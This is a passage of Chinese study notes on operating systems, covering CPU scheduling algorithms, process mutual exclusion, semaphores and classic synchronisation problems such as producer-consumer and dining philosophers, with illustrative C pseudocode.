P4(6))：P2运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度\n\n10时刻(P4(6))：P3运行结束，虽然时间片没用完，但是会主动放弃处理机，发生调度\n\n15时刻()：P4时间片用完，但就绪队列为空，因此会让P4继续执行一个时间片\n\n16时刻：P4运行完，主动放弃处理机。所有进程运行结束\n\n如果时间片太大，使得每个进程都可以在一个时间内就完成，则时间片轮转调度算法退化为先来先服务调度算法，并且会增大进程响应时间。所以时间片不能太大。\n\n另一方面，进程调度、切换是有时间代价的(保存、恢复运行环境)，因此如果时间片太小，会导致进程切换过于频繁，系统会花大量的时间来处理进程切换，从而导致实际用于进程执行的时间比例减少。可见时间片也不能太小。\n\n#### 2.8.7.5 优先级调度算法\n\n算法思想：随着计算机的发展，特别是实时操作系统的出现，越来越多的应用场景需要根据任务的紧急程度来决定处理顺序\n\n算法规则：每个作业/进程有各自的优先级，调度时选择优先级最高的作业/进程\n\n用于作业 / 进程调度：既可用于作业调度，也可用于进程调度。甚至还会用于I/O调度\n\n是否可抢占：抢占式、非抢占式都有。非抢占式只需在进程主动放弃处理机时进行调度即可，而抢占式还需在就绪队列变化时，检查是否会发生抢占\n\n优点：用优先级区别紧急程度、重要程度，适用于实时操作系统。可灵活地调整对各种作业/进程的偏好程度\n\n缺点：若源源不断地有高优先级进程到来，则可能会导致饥饿\n\n是否会导致饥饿：会\n\n例：各进程到达就绪队列的时间、需要的运行时间、进程优先数如下表所示。使用**非抢占式**的优先级调度算法，分析进程运行情况。(注：优先数越大，优先级越高)\n\n| 进程 | 到达时间 | 运行时间 | 优先数 |\n| ---- | -------- | -------- | ------ |\n| P1   | 0        | 7        | 1      |\n| P2   | 2        | 4        | 2      |\n| P3   | 4        | 1        | 3      |\n| P4   | 5        | 4        | 2      |\n\n非抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。\n\n注：以下括号内表示当前处于就绪队列的进程\n\n0时刻(P1)：只有P1到达，P1上处理机\n\n7时刻(P2、P3、P4)：P1运行完成主动放弃处理机，其余进程都已到达，P3优先级最高，P3上处理机\n\n8时刻(P2、P4)：P3完成，P2、P4优先级相同，由于P2先到达，因此P2优先上处理机\n\n12时刻(P4)：P2完成，就绪队列只剩P4，P4上处理机\n\n16时刻()：P4完成，所有进程都结束\n\n例题同上，采用**抢占式**的优先级调度算法。\n\n抢占式的优先级调度算法：每次调度时选择当前已到达且优先级最高的进程。当前进程主动放弃处理机时发生调度。另外，当就绪队列发生改变时也需要检查是否会发生抢占。\n\n注：以下括号内表示当前处于就绪队列的进程\n\n0时刻(P1(7))：只有P1到达，P1上处理机\n\n2时刻(P2(4)、P1(5))：P2到达就绪队列，优先级比P1更高，发生抢占。P1回到就绪队列，P2上处理机\n\n4时刻(P3(1)、P2(2)、P1(5))：P3到达，优先级比P2更高，P2回到就绪队列，P3抢占处理机\n\n5时刻(P2(2)、P4(4)、P1(5))：P3完成，主动释放处理机，同时P4到达，由于P2比P4更先进入就绪队列，因此选择P2上处理机\n\n7时刻(P4(4)、P1(5))：P2完成，就绪队列只剩P1和P4，P4上处理机\n\n11时刻(P1(5))：P4完成，P1上处理机\n\n16时刻()：P1完成，所有进程结束\n\n**补充**：\n\n就绪队列未必只有一个，可以按照不同优先级来组织。另外，也可以把优先级高的进程排在更靠近队头的位置。根据优先级是否可以动态改变，可将优先级分为静态优先级和动态优先级两种。\n\n- 静态优先级：创建进程时确定，之后一直不变。\n- 动态优先级：创建进程时有一个初始值，之后会根据情况动态地调整优先级。\n\n通常，系统进程优先级高于用户进程，前台进程优先级高于后台进程，操作系统更偏好I/O型进程(或称I/O繁忙型进程)。\n\n与I/O型进程相对的是计算型进程(或称CPU繁忙型进程)。\n\n#### 2.8.7.6 多级反馈队列调度算法\n\n算法思想：对其它调度算法的折中权衡\n\n算法规则：\n\n1. 设置多级就绪队列，各级队列优先级从高到低，时间片从小到大\n2. 新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片，若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经是在最下级的队列，则重新放回该队列队尾\n3. 只有第k级队列为空时，才会为k+1级队头的进程分配时间片\n\n用于作业 / 进程调度：用于进程调度\n\n是否可抢占：抢占式算法。在k级队列的进程运行过程中，若更上级的队列(1~k-1级)中进入了一个新进程，则由于新进程处于优先级更高的队列中，因此新进程会抢占处理机，原来运行的进程放回k级队列队尾\n\n优点：对各类进程相对公平(FCFS优点)；每个新到达的进程都可以很快就得到响应(RR优点)；短进程只用较少的时间就可完成(SPF优点)；不必实现估计进程的运行时间(避免用户作假)；可灵活地调整对各类进程的偏好程度，比如CPU密集型进程、I/O密集型进程(拓展：可以将因I/O而阻塞的进程重新放回原队列，这样I/O型进程就可以保持较高优先级)\n\n是否会导致饥饿：会\n\n例：各进程到达就绪队列的时间、需要的运行时间如下表所示。使用多级反馈队列调度算法，分析进程运行的过程。\n\n| 进程 | 到达时间 | 运行时间 |\n| ---- | -------- | -------- |\n| P1   | 0        | 8        |\n| P2   | 1        | 4        |\n| P3   | 5        | 1        |\n\n设置多级就绪队列，各级队列优先级从高到低，时间片从小到大。新进程到达时先进入第1级队列，按FCFS原则排队等待被分配时间片。若用完时间片进程还未结束，则进程进入下一级队列队尾。如果此时已经在最下级的队列，则重新放回最下级队列队尾。只有第k级队列为空时，才会为k+1级队头的进程分配时间片。\n\n## 2.9 进程同步与互斥\n\n进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。\n\n### 2.9.1 进程同步\n\n读进程和写进程并发地执行，由于并发必然导致异步性，因此“写数据”和“读数据”两个操作执行的先后顺序是不确定的。而实际应用中，又必须按照“写数据->读数据”的顺序来执行的。如何解决这种异步问题，就是“进程同步”所讨论的内容。\n\n同步亦称直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而产生的制约关系。进程间的直接制约关系就是源于它们之间的相互合作。\n\n### 2.9.2 进程互斥\n\n进程的“并发”需要“共享”的支持。各个并发执行的进程不可避免地需要共享一些系统资源(比如内存，又比如打印机、摄像头这样的I/O设备)。\n\n我们把一个时间段内只允许一个进程使用的资源称为临界资源。许多物理设备(比如摄像头、打印机)都属于临界资源。此外还有许多变量、数据、内存缓冲区等都属于临界资源。\n\n对临界资源的访问，必须互斥地进行。互斥，亦称间接制约关系。进程互斥指当一个进程访问某临界资源时，另一个想要访问该临界资源的进程必须等待。当前访问临界资源的进程访问结束，释放该资源之后，另一个进程才能去访问临界资源。\n\n对临界资源的互斥访问，可以在逻辑上分为四个部分：\n\n- 进入区：负责检查是否可进入临界区，若可进入，则应设置正在访问临界资源的标志(可理解为“上锁”)，以阻止其它进程同时进入临界区\n- 临界区：访问临界资源的那段代码\n- 退出区：负责解除正在访问临界资源的标志(可理解为“解锁”)\n- 剩余区：做其它处理\n\n为了实现对临界资源的互斥访问，同时保证系统整体性能，需要遵循以下原则：\n\n1. 空闲让进。临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区\n2. 忙则等待。当已有进程进入临界区时，其它试图进入临界区的进程必须等待\n3. 有限等待。对请求访问的进程，应保证能在有限时间内进入临界区(保证不会饥饿)\n4. 让权等待。当进程不能进入临界区时，应立即释放处理机，防止进程忙等待\n\n#### 2.9.2.1 进程互斥的软件实现方法\n\n##### 2.9.2.1.1 单标志法\n\n算法思想：两个进程在访问完临界区后会把使用临界区的权限转交给另一个进程。也就是说每个进程进入临界区的权限只能被另一个进程赋予。\n\n```c\nint turn = 0;\t//turn表示当前允许进入临界区的进程号\n```\n\nP0进程：\n\n```c\nwhile (turn != 0);\t①\t\t//进入区\ncritical section;\t②\t\t//临界区\nturn = 1;\t\t\t③\t\t//退出区\nremainder section;\t④\t\t//剩余区\n```\n\nP1进程：\n\n```c\nwhile(turn != 1);\t⑤\t\t//进入区\ncritical section;\t⑥\t\t//临界区\nturn = 0;\t\t\t⑦\t\t//退出区\nremainder section;\t⑧\t\t//剩余区\n```\n\nturn的初值为0，即刚开始只允许0号进程进入临界区，若P1先上处理机运行，则会一直卡在⑤，直到P1的时间片用完，发生调度，切换P0上处理机运行。代码①不会卡住P0，P0可以正常访问临界区，在P0访问临界区期间即时切换回P1，P1依然会卡在⑤。\n\n因此，该算法可以实现“同一时刻最多只允许一个进程访问临界区”。\n\nturn表示当前允许进入临界区的进程号，而只有当前允许进入临界区的进程在访问了临界区之后，才会修改turn的值。也就是说，对于临界区的访问，一定是按 P0 -> P1 -> P0 -> P1 -> ... 这样轮流访问。这种必须“轮流访问”带来的问题是，如果此时允许进入临界区的进程是P0，而P0一直不访问临界区，那么虽然此时临界区空闲，但是并不允许P1访问。\n\n因此，单标志法存在的主要问题是：违背“空闲让进”原则。\n\n##### 2.9.2.1.2 双标志先检查法\n\n算法思想：设置一个布尔型数组flag[]，数组中各个元素用来标记各进程想进入临界区的意愿，比如`flag[0]=true`意味着0号进程P0现在想要进入临界区。每个进程在进入临界区之前先检查当前有没有别的进程想进入临界区，如果没有，则把自身对应的标志`flag[i]`设为true，之后开始访问临界区。\n\n```c\nbool flag[2];\t\t\t//表示进入临界区意愿的数组\nflag[0] = false;\nflag[1] = false;\t\t//刚开始设置为两个进程都不想进入临界区\n```\n\nP0进程：\n\n```c\nwhile(flag[1]);\t\t①\t\t\nflag[0] = true;\t\t②\t\t\ncritical section;\t③\t\t\nflag[0] = false;\t④\t\t\nremainder section;\t\t\t\n```\n\nP1进程：\n\n```c\nwhile(flag[0]);\t\t⑤\t//如果此时P0想进入临界区，P1就一直循环等待\nflag[1] = true;\t\t⑥\t//标记为P1进程想要进入临界区\ncritical section;\t⑦\t//访问临界区\nflag[1] = false;\t⑧\t//访问完临界区，修改标记为P1不想使用临界区\nremainder section;\t\n```\n\n若按照①⑤②⑥③⑦...的顺序执行，P0和P1将会同时访问临界区。因此，双标志位先检查法的主要问题是：违反“忙则等待”原则。原因在于，进入区的“检查”和“上锁”两个处理不是一气呵成的。“检查”后，“上锁”前可能发生进程切换。\n\n##### 2.9.2.1.3 双标志后检查法\n\n算法思想：双标志先检查法的改版。前一个算法的问题是先“检查”后“上锁”，但是这两个操作又无法一气呵成，因此导致了两个进程同时进入临界区的问题。因此，人们又想到先“上锁”后“检查”的方法，来避免上述问题。\n\n```c\nbool flag[2];\t\t\t//表示进入临界区意愿的数组\nflag[0] = false;\nflag[1] = false;\t\t//刚开始设置为两个进程都不想进入临界区\n```\n\nP0进程：\n\n```c\nflag[0] = true;\t\t①\nwhile(flag[1]);\t\t②\t\t\t\t\ncritical section;\t③\t\t\nflag[0] = false;\t④\t\t\nremainder section;\t\t\t\n```\n\nP1进程：\n\n```c\nflag[1] = true;\t\t⑤\t//标记为P1进程想要进入临界区\nwhile(flag[0]);\t\t⑥\t//如果P0也想进入临界区，则P1循环等待\ncritical section;\t⑦\t//访问临界区\nflag[1] = false;\t⑧\t//访问完临界区，修改标记为P1不想使用临界区\nremainder section;\t\n```\n\n若按照①⑤②⑥...的顺序执行，P0和P1都将无法进入临界区。因此，双标志后检查法虽然解决了“忙则等待”的问题，但是又违背了“空闲让进”和“有限等待”原则，会因各进程都长期无法访问临界资源而产生“饥饿”现象。\n\n##### 2.9.2.1.4 Peterson算法\n\n算法思想：双标志后检查法中，两个进程都争着想进入临界区，但是谁也不让谁，最后谁都无法进入临界区。Gary L·Perterson想到了一种方法，如果双方都争着想进入临界区，那可以让进程尝试“孔融让梨”，主动让对方先使用临界区。\n\n```c\nbool flag[2];\t//表示进入临界区意愿的数组，初始值都是false\nint turn = 0;\t//turn表示优先让哪个进程进入临界区\n```\n\nP0进程：\n\n```c\nflag[0] = true;\t\t\t\t\t①\nturn = 1;\t\t\t\t\t\t②\nwhile(flag[1] && turn == 1);\t③\ncritical section;\t\t\t\t④\nflag[0] = false;\t\t\t\t⑤\nremainder section;\n```\n\nP1进程：\n\n```c\nflag[1] = true;\t\t\t\t\t⑥\t//表示自己想进入临界区\nturn = 0;\t\t\t\t\t\t⑦\t//可以优先让对方进入临界区\nwhile(flag[0] && turn == 0);\t⑧\t//对方想进，且最后一次是自己“让梨”，那自己就循环等待\ncritical section;\t\t\t\t⑨\t\nflag[1] = false;\t\t\t\t⑩\t//访问完临界区，表示自己已经不想访问临界区了\nremainder section;\n```\n\n两种双标志法的问题都是由于进入区的几个操作不能一气呵成导致的。我们可以推理验证在Peterson算法中，两个进程进入区中的各个操作按不同的顺序穿插执行会发生什么情况：①⑥②③⑦⑧③④⑤...\n\nPeterson算法用软件方法解决了进程互斥问题，遵循了空闲让进、忙则等待、有限等待三个原则，但是依然未遵循让权等待的原则。\n\n#### 2.9.2.2 进程互斥的硬件实现方法\n\n##### 2.9.2.2.1 中断屏蔽方法\n\n利用“开/关中断指令”实现(与原语的实现思想相同，即在某进程开始访问临界区到结束访问为止都不允许被中断，也就不能发生进程切换，因此也不可能发生两个同时访问临界区的情况)。\n\n将临界区放在关/开中断之间，关中断后即不允许当前进程被中断，也必然不会发生进程切换，直到当前进程访问完临界区，再执行开中断指令，才有可能有别的进程上处理机并访问临界区。\n\n优点：简单、高效\n\n缺点：不适用于多处理机，只适用于操作系统内核进程，不适用于用户进程(因为关/开中断指令只能运行在内核态，这组指令如果能让用户随意使用会很危险)。\n\n##### 2.9.2.2.2 TestandSet指令\n\n简称TS指令，也有地方称TestandSetLock指令，或TSL指令。\n\nTSL指令是用硬件实现的，执行的过程不允许被中断，只能一气呵成。以下是用C语言描述的逻辑：\n\n```c\n// 布尔型共享变量 lock 表示当前临界区是否被加锁\n// true表示已加锁，false表示未加锁\nbool TestAndSet(bool *lock){\n    bool old;\n    old = *lock;    //old用来存放lock，原来的值\n    *lock = true;   //无论之前是否已加锁，都将lock设为true\n    return old;     //返回lock原来的值\n}\n \n// 以下是使用 TSL 指令实现互斥的算法逻辑\nwhile(TestAndSet(&lock)); //\"上锁\"并\"检查\"\n//临界区代码段...\nlock = false;       //\"解锁\"\n//剩余区代码段...\n```\n\n若刚开始lock是false，则TSL返回的old值为false，while循环条件不满足，直接跳过循环，进入临界区。若刚开始 lock 是 true，则执行TSL后old返回值为true，while循环条件满足，会一直循环，直到当前访问临界区的进程在退出区进行“解锁”。\n\n相比于软件实现方法，TSL指令把“上锁”和“检查”操作用硬件的方式变成了一气呵成的原子操作。\n\n优点：实现简单，无需像软件实现方法那样严格检查是否有逻辑漏洞；适用于多处理机环境。\n\n缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。\n\n##### 2.9.2.2.3 Swap指令\n\n有的地方也叫Exchange指令，或简称XCHG指令。\n\nSwap指令也是用硬件实现的，执行过程不允许中断，只能一气呵成。以下是用C语言描述的逻辑：\n\n```c\n// Swap指令的作业是交换两个变量的值\nSwap(bool *a, bool *b){\n    bool temp;\n    temp = *a;\n    *a = *b;\n    *b = temp;\n}\n \n// 以下是用Swap指令实现互斥的逻辑算法\n// lock表示当前临界区是否被加锁\nbool old = true;\nwhile(old == true)\n    Swap(&lock, &old);\n//临界区代码段...\nlock = false;\n//剩余区代码段...\n```\n\n逻辑上来看Swap和TSL并无太大区别，都是先记录下此时临界区是否已经被上锁(记录在old变量上)，再将上锁标记lock设置为true，最后检查old，如果old为false则说明之前没有别的进程对临界区上锁，则可跳出循环，进入临界区。\n\n优点：实现简单，无需像软件实现方法那样严格检查是否会有逻辑漏洞；适用于多处理机环境。\n\n缺点：不满足“让权等待”原则，暂时无法进入临界区的进程会占用CPU并循环执行TSL指令，从而导致“忙等”。\n\n## 2.10 信号量机制\n\n用户进程可以通过使用操作系统提供的一对原语来对信号量进行操作，从而很方便地实现了进程互斥、进程同步。\n\n信号量其实就是一个变量(可以是一个整数，也可以是更复杂的记录型变量)，可以用一个信号量来表示系统中某种资源的数量，比如：系统中只有一台打印机，就可以设置一个初值为1的信号量。\n\n原语是一种特殊的程序段，其执行只能一气呵成，不可被中断。原语是由关中断/开中断指令实现的。软件解决方案的主要问题是由“进入区的各种操作无法一气呵成”，因此如果能把进入区、退出区的操作都用原语实现，使这些操作能“一气呵成”就能避免问题。\n\n一对原语：wait(S)原语和signal(S)原语，可以把原语理解为我们自己写的函数，函数名分别为wait和signal，括号里的信号量S其实就是函数调用时传入的一个参数。\n\nwait、signal原语常简称为P、V操作，因此通常把wait(S)、signal(S)两个操作分别写为P(S)、V(S)。\n\n### 2.10.1 整型信号量\n\n用一个整数型的变量作为信号量，用来表示系统中某种资源的数量。\n\n与普通整型变量的区别：对信号量的操作只有三种，即初始化、P操作、V操作。\n\n比如某计算机系统中有一台打印机：\n\n```c\nint S = 1;\t//初始化整型信号量S，表示当前系统中可用的打印机资源数\n\nvoid wiat(int S)\t\t//wait原语，相当于“进入区”\n{\n    while(S <= 0);\t\t//如果资源数不够，就一直循环等待\n    S = S - 1;\t\t\t//如果资源数够，则占用一个资源\n}\n\nvoid signal(int S)\t\t//signal原语，相当于“退出区”\n{\n    S = S + 1;\t\t\t//使用完资源后，在退出区释放资源\n}\n```\n\n```c\n进程P0：\n...\nwait(S);\t\t\t//进入区，申请资源\n使用打印机资源...\t\t//临界区，访问资源\nsignal(S);\t\t\t//退出区，释放资源\n```\n\n“检查”和“上锁”一气呵成，避免了并发、异步导致的问题。\n\n存在的问题：不满足“让权等待”原则，会发生“忙等”。\n\n### 2.10.2 记录型信号量\n\n整型信号量的缺陷是存在“忙等”问题，因此人们又提出了“记录型信号量”，即用记录型数据结构表示的信号量。\n\n```c\n/*记录型信号量的定义*/\ntypedef struct\n{\n    int value;\t\t\t//剩余资源数\n    struct process *L;\t//等待队列\n}semaphore;\n\n/*某进程需要使用资源时，通过wait原语申请*/\nvoid wait(semaphore S)\n{\n    S.value--;\n    if(S.value < 0)\n        block(S.L);\n}\n/**\n如果剩余资源数不够，使用block原语使进程从运行态进入阻塞态，并把挂到信号量S的等待队列(即阻塞队列)中。\n*/\n\n/*进程使用完资源后，通过signal原语释放*/\nvoid signal(semaphore S)\n{\n    S.value++;\n    if(S.value <= 0)\n        wakeup(S.L);\n}\n/**\n释放资源后，若还有别的进程在等待这种资源，则使用wakeup原语唤醒等待队列中的一个进程，该进程从阻塞态变为就绪态\n*/\n```\n\n对信号量S的一次P操作意味着进程请求一个单位的该类资源，因此需要执行`S.value--;`，表示资源数减1，当`S.value<0`时表示该类资源已分配完毕，因此进程应调用block原语进行自我阻塞(当前运行的进程从运行态 -> 阻塞态)，主动放弃处理机，并插入该类资源的等待队列S.L中。可见，该机制遵循了“让权等待”原则，不会出现“忙等”现象。\n\n对信号量S的一次V操作意味着进程释放一个单位的该类资源，因此需要执行`S.value++;`，表示资源数加1，若加1后仍是`S.value<=0`，表示依然有进程在等待该类资源，因此应调用wakeup原语唤醒等待队列中的第一个进程(被唤醒进程从阻塞态 -> 就绪态)。\n\n### 2.10.3 用信号量实现进程互斥、同步、前驱关系\n\n#### 2.10.3.1 实现进程互斥\n\n1. 分析并发进程的关键活动，划定临界区(如：对临界资源打印机的访问就应放在临界区)\n2. 设置互斥信号量mutex，初值为1\n3. 在临界区之前执行P(mutex)\n4. 在临界区之后执行V(mutex)\n\n注意：对不同的临界资源需要设置不同的互斥信号量。P、V操作必须成对出现，缺少P(mutex)就不能保证临界资源的互斥访问；缺少V(mutex)会导致资源永不被释放，等待进程永不被唤醒。\n\n#### 2.10.3.2 实现进程同步\n\n进程同步：要让各并发进程按要求有序地推进。\n\n1. 分析什么地方需要实现“同步关系”，即必须保证“一前一后”执行的两个操作(或两句代码)\n2. 设置同步信号量S，初始为0\n3. 在“前操作”之后执行V(S)\n4. 在“后操作”之前执行P(S)\n\n如何保证代码2在代码4之前？\n\n```c\nsemaphore S = 0;\t//初始化同步信号量，初始值为0\nP1()\n{\n    代码1;\n    代码2;\n    V(S);\n    代码3;\n}\n\nP2()\n{\n    P(S);\n    代码4;\n    代码5;\n    代码6;\n}\n```\n\n若先执行到V(S)操作，则S++后S=1。之后当执行到P(S)操作时，由于S=1，表示有可用资源，会执行S--，S的值变回0，P2进程不会执行block原语，而是继续往下执行代码4。\n\n若先执行到P(S)操作，由于S=0，S--后S=-1，表示此时没有可用资源，因此P操作中会执行block原语，主动请求阻塞。之后当执行完代码2，继而执行V(S)操作，S++，使S变回0，由于此时有进程在该信号量对应的阻塞队列中，因此会在V操作中执行wakeup原语，唤醒P2进程。这样P2就可以继续执行代码4了。\n\n#### 2.10.3.3 实现前驱关系\n\n进程P1中有句代码S1，P2中有句代码S2，...，P6中有句代码S6。这些代码要求按如下前驱图所示的顺序来执行：\n\n{% asset_img 2.10.3.3.png 前驱图 %}\n\n{% asset_img 2.10.3.3.1.png 前驱图 %}\n\n### 2.10.4 生产者-消费者问题\n\n系统中有一组生产者进程和一组消费者进程，生产者进程每次生产一个产品放入缓冲区，消费者进程每次从缓冲区中去除一个产品并使用。(注：这里的“产品”理解为某种数据)\n\n生产者、消费者共享一个初始为空、大小为n的缓冲区。只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待。只有缓冲区不空时，消费者才能从中取出产品，否则必须等待。缓冲区是临界资源，各进程必须互斥地访问。\n\n如何用信号量机制(P、V操作)实现生产者、消费者进程的这些功能呢？信号量机制可实现互斥、同步、对一类系统资源的申请和释放。\n\n互斥：设置初值为1的互斥信号量\n\n同步：设置初值为0的同步信号量(实现“一前一后”)\n\n对一类系统资源的申请和释放：设置一个信号量，初始值即为资源的数量(本质上也属于“同步问题”，若无空闲资源，则申请资源的进程需要等待别的进程释放资源后才能继续往下执行)\n\nPV操作题目分析步骤：\n\n1. 关系分析。找出题目中描述的各个进程，分析它们之间的同步、互斥关系。\n\n2. 整理思路。根据各进程的操作流程确定P、V操作的大致顺序。\n\n   生产者每次要消耗(P)一个空闲缓冲区，并生产(V)一个产品；消费者每次要消耗(P)一个产品，并释放一个空闲缓冲区(V)。往缓冲区放入/取走产品需要互斥。\n\n3. 设置信号量。设置需要的信号量，并根据题目条件确定信号量初值。(互斥信号量初值一般为1，同步信号量的初始值要看对应资源的初始值是多少)\n\n```c\nsemaphore mutex = 1;\t\t//互斥信号量，实现对缓冲区的互斥访问\nsemaphore empty = n;\t\t//同步信号量，表示空闲缓冲区的数量\nsemaphore full = 0;\t\t\t//同步信号量，表示产品的数量，也即非空缓冲区的数量\n```\n\n```c\nproducer()\n{\n    while(1)\n    {\n        生产一个产品;\n        P(empty);\t\t//消耗一个空闲缓冲区\n        P(mutex);\t\t//实现互斥是在同一进程中进行一对PV操作\n        把产品放入缓冲区;\n        V(mutex);\n        V(full);\t\t//增加一个产品\n        \t\t\t\t//V(full)和下面的P(full)实现两进程的同步关系，是在其中一个进程中执行P，另一进程中执行V\n    }\n}\n\nconsumer()\n{\n    while(1)\n    {\n        P(full);\t\t//消耗一个产品(非空缓冲区)\n        P(mutex);\n        从缓冲区取出一个产品;\n        V(mutex);\n        V(empty);\t\t//增加一个空闲缓冲区\n        使用产品;\n    }\n}\n```\n\n如果将生产者进程和消费者进程里面的两个P互换位置：\n\n```c\nproducer()\n{\n    while(1)\n    {\n        生产一个产品;\t\t\n        P(mutex);\t\t①\n        P(empty);\t\t②\n        把产品放入缓冲区;\n        V(mutex);\n        V(full);\t\t\n    }\n}\n\nconsumer()\n{\n    while(1)\n    {\t\n        P(mutex);\t\t③\n        P(full);\t\t④\n        从缓冲区取出一个产品;\n        V(mutex);\n        V(empty);\t\t\n        使用产品;\n    }\n}\n```\n\n若此时缓冲区内已经放满产品，也就是empty = 0，full = n。则生产者进程执行①使mutex变为0，再执行②，由于已没有空闲缓冲区，因此生产者被阻塞。由于生产者阻塞，因此切换回消费者进程。消费者进程执行③，由于mutex为0，即生产者还没释放对临界资源的“锁”，因此消费者也被阻塞。这就造成了生产者等待消费者释放空闲缓冲区，而消费者又等待生产者释放临界区的情况，生产者和消费者循环等待被对方唤醒，出现“死锁”。\n\n同样的，若缓冲区中没有产品，即full = 0，empty = n。按③④①的顺序执行也会发生死锁。因此，实现互斥的P操作一定要在实现同步的P操作之后。\n\n### 2.10.5 多类生产者-多类消费者问题\n\n桌子上有一只盘子，每次只能向其中放入一个水果。爸爸专向盘子中放苹果，妈妈专向盘子中放橘子，儿子专等着吃盘子中的橘子，女儿专等着吃盘子中的苹果。只有盘子空时，爸爸或妈妈才可向盘子中放一个水果。仅当盘子中有自己需要的水果时，儿子或女儿可以从盘子中取出水果。用PV操作实现上述过程。\n\n1. 关系分析。\n\n   互斥关系：对缓冲区(盘子)的访问要互斥地进行\n\n   同步关系(一前一后)：\n\n   - 父亲将苹果放入盘子后，女儿才能取苹果\n   - 母亲将橘子放入盘子后，儿子才能取橘子\n   - 只有盘子为空时，父亲或母亲才能放入水果(“盘子为空”这个事件可以由儿子或女儿触发，事件发生后才允许父亲或母亲放水果)\n\n2. 整理思路。\n\n   互斥：在临界区前后分别PV\n\n   同步：前V后P\n\n3. 设置信号量。\n\n   ```c\n   semaphore mutex = 1;\t//实现互斥访问盘子\n   semaphore apple = 0;\t//盘子中有几个苹果\n   semaphore orange = 0;\t//盘子中有几个橘子\n   semaphore plate = 1;\t//盘子中还可以放多少个水果\n   ```\n\n{% asset_img 2.10.5.1.png 多生产者-多消费者 %}\n\n{% asset_img 2.10.5.2.png 多生产者-多消费者 %}\n\n原因在于：本题中的缓冲区大小为1，在任何时刻，apple、orange、plate三个同步信号量中最多只有一个是1。因此在任何时刻，最多只有一个进程的P操作不会被阻塞，并顺利地进入临界区。\n\n{% asset_img 2.10.5.3.png 多生产者-多消费者 %}\n\n但加上总没错，设置互斥信号量就对了。\n\n### 2.10.6 吸烟者问题\n\n假设一个系统有三个吸烟者进程和一个供应者进程。每个抽烟者不停地卷烟并抽掉它，但是要卷起并抽掉一支烟，抽烟需要有三种材料：烟草、纸和胶水。三个抽烟者中，第一个拥有烟草、第二个拥有纸、第三个拥有胶水。供应者进程无限地提供三种材料，供应者每次将两种材料放桌子上，拥有剩下那种材料的抽烟者卷一根烟并抽掉它，并给供应者进程一个信号告诉完成了，供应者就会放另外两种材料在桌上，这个过程一直重复(让三个抽烟者轮流抽烟)。\n\n本质上这题也属于“生产者-消费者”问题，更详细的说应该是“可生产多种产品的单生产者-多消费者”。\n\n1. 关系分析。\n\n   互斥：桌子可以抽象为容量为1的缓冲区，要互斥访问\n\n   - 组合一：纸+胶水\n   - 组合二：烟草+胶水\n   - 组合三：烟草+纸\n\n   同步：\n\n   - 桌上有组合一 -> 第一个抽烟者取走东西\n   - 桌上有组合二 -> 第二个抽烟者取走东西\n   - 桌上有组合三 -> 第三个抽烟者取走东西\n   - 发出完成信号 -> 供应者将下一个组合放到桌上\n\n2. 整理思路。\n\n   互斥：在临界区前后分别PV\n\n   同步：前V后P\n\n3. 设置信号量。\n\n   ```c\n   semaphore offer1 = 0;\t\t//桌上组合一的数量\n   semaphore offer2 = 0;\t\t//桌上组合二的数量\n   semaphore offer3 = 0;\t\t//桌上组合三的数量\n   semaphore finish = 0;\t\t//抽烟是否完成\n   int i = 0;\t\t\t\t\t//用于实现“三个抽烟者轮流抽烟”\n   ```\n\n{% asset_img 2.10.5.4.png 吸烟者问题 %}\n\n### 2.10.7 读者-写者问题\n\n有读者和写者两组并发进程，共享一个文件，当两个或两个以上的读进程同时访问共享数据时不会产生副作用，但若某个写进程和其它进程(读进程或写进程)同时访问共享数据时则可能导致数据不一致的错误。因此要求：①允许多个读者可以同时对文件执行读操作；②只允许一个写者往文件中写信息；③任一写者在完成写操作之前不允许其它读者或写者工作；④写者执行写操作前，应让已有的读者和写者全部退出。\n\n两类进程：写进程、读进程\n\n互斥关系：写进程-写进程，写进程-读进程。读进程与读进程不存在互斥问题\n\n写者进程和任何进程都互斥，设置一个互斥信号量rw，在写者访问共享文件前后分别执行P、V操作。读者进程和写者进程也要互斥，因此读者访问共享文件前后也要对rw执行P、V操作。如果所有读者进程在访问共享文件之前都执行P(rw)操作，那么会导致各个读进程之间也无法同时访问文件。Key：读者写者问题的核心思想——怎么处理该问题？\n\nP(rw)和V(rw)其实就是对共享文件的“加锁”和“解锁”。既然各个读进程需要同时访问，而读进程与写进程又必须互斥访问，那么我们可以让第一个访问文件的读进程“加锁”，让最后一个访问完文件的读进程“解锁”。可以设置一个整数变量count来记录当前有几个读进程在访问文件。\n\n{% asset_img 2.10.png 读者写者问题 %}\n\n{% asset_img 2.10.7.png 读者写者问题 %}\n\n### 2.10.8 哲学家进餐问题\n\n一张圆桌上坐着5名哲学家，每2个哲学家之间的桌上摆一根筷子，桌子的中间是一碗米饭。哲学家们倾注毕生的精力用于思考和进餐，哲学家在思考时，并不影响他人。只有当哲学家饥饿时，才试图拿起左、右两根筷子(一根一根地拿起)。如果筷子已在他人手上，则需等待。饥饿的哲学家只有同时拿起两根筷子才可以开始进餐，当进餐完毕后，放下筷子继续思考。\n\n1. 关系分析。系统中有5个哲学家进程，5位哲学家与左右邻居对其中间筷子的访问是互斥关系。\n2. 整理思路。这个问题中只有互斥关系，但与之前遇到的问题不同的是，每个哲学家进程需要同时持有两个临界资源才能开始吃饭。如何避免临界资源分配不当造成的死锁现象，是哲学家问题的精髓。\n3. 信号量设置。定义互斥信号量数组chopstick[5]={1,1,1,1,1}用于实现对5个筷子的互斥访问。并对哲学家按0~4编号，哲学家i左边的筷子编号为i，右边的筷子编号为(i+1)%5。\n\n```c\nsemaphore chopstick[5] = {1,1,1,1,1};\nPi()\n{\n    while(1)\n    {\n        P(chopstick[i]);\t\t//拿左\n        P(chopstick[(i+1)%5]);\t//拿右\n        吃饭...\n        V(chopstick[i]);\t\t//放左\n        V(chopstick[(i+1)%5]);\t//放右\n        思考...\n    